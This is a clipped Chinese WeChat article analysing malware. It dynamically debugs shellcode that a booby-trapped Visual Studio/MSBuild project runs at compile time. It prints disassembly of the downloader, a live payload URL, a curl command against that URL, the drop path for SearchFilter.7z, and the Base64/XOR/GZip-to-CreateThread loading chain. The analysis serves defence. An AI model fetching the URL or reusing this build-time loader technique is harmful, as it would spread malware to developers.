---
title: 【微信】惊心！歹毒！遭遇【VS编译时触发后门】保卫战（三）---调试shellcode.bin
source: https://mp.weixin.qq.com/s/Ay9HlNsKvY747EpkxB9e6w
source_host: mp.weixin.qq.com
clip_date: 2026-10-08T17:36:51+08:00
trace_id: be166e15-d382-4440-a51c-5c06517495bf
content_hash: 1c022c9a62eb46c344ed2bfaaae9403969216d64ad2e4bc5bdd415b950761785
status: synced
tags:
  - 微信
  - 恶意样本
  - Windows逆向
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: IDA9 动态调试 VS 编译时触发的 shellcode.bin，成功捕获静态分析遗漏的下载地址 https://rlim.com/seraswodinsx 及其"下载→落地→解压→执行"完整行为链。
ai_summary_style: key-points
images_status:
  total: 8
  succeeded: 8
  failed_urls: []
notion_page_id: 3f375244-d011-8132-96cb-fa2c92fd5008
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> IDA9 动态调试 VS 编译时触发的 shellcode.bin，成功捕获静态分析遗漏的下载地址 https://rlim.com/seraswodinsx 及其"下载→落地→解压→执行"完整行为链。
> 
> - **调试入口：** shellcode 外需加"壳"，从壳外走到 CreateThread 线程起始地址 0x24B9BE60000，入口仅一条 jmp 253A；静态分析时未见 URL。
> - **URL 与伪装：** RCX/RBX=DA80，[DA80] 指向字符串 https://rlim.com/seraswodinsx，并出现 UA 伪装 "Mozilla/5.0 (Windows NT 10.0; Win64; x64..."；CALL [R15+0xd0]，[DC60]=wininet_InternetOpenUrlA。
> - **失败重试：** 0x4b9 TEST RAX,RAX 判成败；失败调 GetLastError，错误码为 0x2ee7/0x2efd/0x2eff 时 Sleep(200ms) 回到 0x49f 重试，且只重试一次。
> - **读取与返回：** 0x500 起循环查可用量→InternetReadFile；返回 RAX 为累计读入字节数，读满 0x40000(256KB) 才算成功，否则 Sleep(20s) 重下；收尾关闭 hUrl、hInternet 句柄。
> - **落地与完整链：** 载荷落地 %LOCALAPPDATA%\Microsoft\Feeds\SearchFilter.7z，由 C:\ProgramData\sevenZip\7z.exe 解压并执行 SearchFilter.exe；上游为 MSBuild 触发 cYhrfP5mH9 → 内联 C# 任务 cG5nbiSNoL → Base64 + 三轮 XOR（32 字节密钥）→ GZip 解出 12998 字节 x64 shellcode → VirtualAlloc/Marshal.Copy/VirtualProtect(RX)/CreateThread。curl 访问该域名时火绒报警。

**MicroPest** *2026年10月8日 17:10*

## 这里我来分析shellcode.bin这个文件，它是在vs2022编译时启动的shellcode，主要起下载器作用，在静态分析时没有找到它的Url下载木马载荷地址。我们这篇来动态调试。

1、用IDA9来动态调试。如何用IDA9调试shellcode，这个大家都会，这里就不作介绍了。

2、要在shellcode外面加个“壳”，调试要从壳外走到壳内的shellcode位置，如下图：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/df718ed2d8308bff.png)

上图这个就是在当前IDA中shellcode的基址位置。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ea01d1ea4336e971.png)

2、继续，

上图这里要用CreateThread启动线程了，线程地址为： 0x24B9BE60000

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/68b743622081c92c.png)

上图就是线程开始，就一条跳转指令：jmp 253A，

3、我们继续，来到Download处，如下图：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/66204c705e285133.png)

```apache
0x287a  LEA R13,[R15+0x20]
0x287e  MOV RCX,[R13]        ; RCX = 字符串#1
0x28aa  MOV RCX,[R13]        ; 下载函数 arg1 = URL
0x28c4  CALL 0x3e5           ; download(URL=字符串#1, ...)
```

上图显示，RCX=DA80

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/cc29044652c8406c.png)

```javascript
https://rlim.com/seraswodinsx
```

上图中\[DA80\]处指向的就是 Url 位置，这个就是URL下载地址了。

4、我们继续，看是否出现连接互联网的函数。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/cbaad3f4b15e47c6.png)

上图中 rbx=DA80=Url，同时出现浏览器UA标识“Mozilla/5.0 (Windows NT 10.0; Win64; x6...”

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/41bc3e7767dfbc8b.png)

```apache
0x3f6   MOV RBX,RCX          ; RBX = URL
0x496   MOV RDX,RBX          ; RDX = lpszUrl（InternetOpenUrlA 第 2 参数）
0x4b2   CALL [R15+0xd0]      ; InternetOpenUrlA(hInternet, lpszUrl=RBX, ...)
```

上图中，注意：CALL \[R15+0xd0\]，如上图，R15+0xd0=DC60，\[DC60\]=wininet_InternetOpenUrlA，说明在这里调用了这个打开url的函数。

### 5、另：我们来访问这个域名看看，如下图curl -L -o output.html -v https://rlim.com/seraswodinsx，火绒报警：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/eb61bb0d7ac88ec6.png)

6、接着上面的动作wininet_InternetOpenUrlA后继续，

## 检查 InternetOpenUrlA 返回值（0x4b9）

```apache
0x4b9  TEST RAX,RAX
0x4bc  JNE  .+66        ; 非 0（成功）→ 跳到 0x500
0x4be  CMP  [RSP+0x48],0
0x4c3  JNE  .+209       ; 已重试过 → 跳到 0x594 收尾
```

-   **成功**
    
    ： `RAX != 0` → 进入读取循环（ `0x500` ）。
    
-   **失败**
    
    ：
    

-   `0x4c9 CALL [R15+0x100]`
    
    → `GetLastError()`
    
-   `0x4d0–0x4e3`
    
    判断错误码是否为 `0x2ee7 / 0x2efd / 0x2eff` （三个特定网络错误，分别对应 `ERROR_INTERNET_*` 类）
    
-   **是**
    
    ： `0x4ea MOV [RSP+0x48],1` （置"已重试"标志）→ `0x4f2 MOV ECX,0xc8` → `0x4f7 CALL [R15+0xf8]` → **`Sleep(200ms)`** → `0x4fe JMP .-109` **回到 0x49f 重新调用 InternetOpenUrlA 重试**
    
-   **否**
    
    ： `0x4e5 JMP .+176` → 跳到 `0x594` 收尾
    

> 注意：这条重试路径是 **只重试一次** （ `[RSP+0x48]` 置 1 后，下次失败直接走收尾）。

## 读取响应体循环（0x500 起）

```javascript
0x500  MOV R13,RAX                 ; R13 = hUrl 句柄
0x503  MOV [RSP+0x38],0            ; dwNumberOfBytesAvailable = 0
0x50b  MOV [RSP+0x3c],4            ; 查询项 = 4 (INTERNET_OPTION_...)
0x513  MOV [RSP+0x40],0            ; 输出值
```

## 。。。。

## 这就是读取循环主体：查询可用量 → 过滤区间 → InternetReadFile → 前进指针/累加 → 循环，直到无空间或读到 0。

## 收尾清理（0x594–0x5c9）

```apache
0x595  JMP .+3                     ; 读失败路径落到 0x597
0x597  XOR R14,R14                 ; 读失败 → 总读入量置 0（表示下载失败）
0x59a  TEST R13,R13
0x59d  JE   .+10
0x59f  MOV RCX,R13
0x5a2  CALL [R15+0xe0]             ; InternetCloseHandle(hUrl)
0x5a9  TEST R12,R12
0x5ac  JE   .+10
0x5ae  MOV RCX,R12
0x5b1  CALL [R15+0xe0]             ; InternetCloseHandle(hInternet)  ← 关闭 InternetOpen 的会话句柄
0x5b8  MOV RAX,R14                 ; ★ 返回值 = 累计读入字节数
0x5bb  LEA RSP,[RBP-0x30]
0x5bf  POP R14 / 0x5c1 POP R13 / 0x5c3 POP R12 / 0x5c5 POP RDI / 0x5c6 POP RSI / 0x5c7 POP RBX / 0x5c8 POP RBP
0x5c9  RET
```

**函数返回 RAX = R14 = 本次下载累计读到的总字节数** （失败时为 0）。

返回主控后的动作（回到 0x28c9）

下载函数返回后，主控继续：

```css
0x28c9  MOV R12,RAX                ; 保存返回值（总字节数）
0x28cc  CMP [R15+0x58],0           ; 检查状态字段
0x28d1  JNE .+19
0x28d3  ...                        ; 日志/错误处理（空串占位）
0x28fd  CMP [R15+0x58],0x40000     ; ★ 是否读满 0x40000 (256KB)？
0x2905  JNE .+19
0x2907  ...                        ; 未读满 → 日志
0x291a  MOV RAX,R12
0x291d  TEST RAX,RAX
0x2920  JNE .+89                   ; 非 0 → 成功，进入落地流程
                                   ; 否则进入重试：Sleep(20s) 后重下（0x296c）
```

即： **读满 256KB（或非零）视为下载成功**，继续走「写文件 → 7z 解压 → 执行 SearchFilter.exe」；否则 **`Sleep(20000ms)` 后重试下载**。

### 7、行为链（下载侧）已闭环：

```javascript
伪装 Chrome UA → InternetOpenA → InternetOpenUrlA("https://rlim.com/seraswodinsx", flags=0x84000000)
  → InternetReadFile 循环读满 → 落地 %LOCALAPPDATA%\Microsoft\Feeds\SearchFilter.7z
  → C:\ProgramData\sevenZip\7z.exe 解压 → 执行 SearchFilter.exe
```

### 8、完整行为链（编译时释放后）：

```nginx
MSBuild 触发 cYhrfP5mH9 → 内联 C# 任务 cG5nbiSNoL
  Base64 → 三轮 XOR(32字节密钥) → GZip 解压 → 12998 字节 x64 shellcode
  VirtualAlloc → Marshal.Copy → VirtualProtect(RX) → CreateThread
shellcode 运行：
  伪装 Chrome UA → InternetOpenUrlA("https://rlim.com/seraswodinsx")
  → 下载 SearchFilter.7z → 落地 %LOCALAPPDATA%\Microsoft\Feeds\
  → C:\ProgramData\sevenZip\7z.exe 解压 → 执行 SearchFilter.exe
```

至此，我们动态分析完成了shellcode.bin这个文件，调试出了下载地址。
